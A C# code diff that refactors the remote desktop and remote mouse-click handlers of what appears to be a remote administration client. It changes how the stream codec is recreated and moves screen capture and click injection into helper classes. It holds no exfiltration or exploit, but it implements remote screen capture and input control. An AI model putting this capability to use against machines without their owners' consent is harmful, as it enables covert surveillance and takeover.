@@ -6,6 +6,8 @@ using xClient.Core.Helper;
 using System.Drawing.Imaging;
 using System.Threading;
 using xClient.Core.Networking;
+using xClient.Core.Utilities;
+using xClient.Enums;
 
 namespace xClient.Core.Commands
 {
@@ -24,8 +26,16 @@ namespace xClient.Core.Commands
 
             IsStreamingDesktop = true;
 
-            if (StreamCodec == null || StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor)
+            if (StreamCodec == null)
                 StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);
+
+            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor)
+            {
+                if (StreamCodec != null)
+                    StreamCodec.Dispose();
+
+                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor);
+            }
 
             new Thread(() =>
             {
@@ -40,7 +50,7 @@ namespace xClient.Core.Commands
                     Bitmap desktop = null;
                     try
                     {
-                        desktop = Helper.Helper.GetDesktop(command.Monitor);
+                        desktop = RemoteDesktopHelper.GetDesktop(command.Monitor);
                         desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                             ImageLockMode.ReadWrite, desktop.PixelFormat);
 
@@ -86,25 +96,11 @@ namespace xClient.Core.Commands
 
             if (command.LeftClick)
             {
-                SetCursorPos(p.X, p.Y);
-                mouse_event(MOUSEEVENTF_LEFTDOWN, p.X, p.Y, 0, 0);
-                mouse_event(MOUSEEVENTF_LEFTUP, p.X, p.Y, 0, 0);
-                if (command.DoubleClick)
-                {
-                    mouse_event(MOUSEEVENTF_LEFTDOWN, p.X, p.Y, 0, 0);
-                    mouse_event(MOUSEEVENTF_LEFTUP, p.X, p.Y, 0, 0);
-                }
+                NativeMethodsHelper.DoMouseClickLeft(p, command.DoubleClick);
             }
             else
             {
-                SetCursorPos(p.X, p.Y);
-                mouse_event(MOUSEEVENTF_RIGHTDOWN, p.X, p.Y, 0, 0);
-                mouse_event(MOUSEEVENTF_RIGHTUP, p.X, p.Y, 0, 0);
-                if (command.DoubleClick)
-                {
-                    mouse_event(MOUSEEVENTF_RIGHTDOWN, p.X, p.Y, 0, 0);
-                    mouse_event(MOUSEEVENTF_RIGHTUP, p.X, p.Y, 0, 0);
-                }
+                NativeMethodsHelper.DoMouseClickRight(p, command.DoubleClick);
             }
         }
 
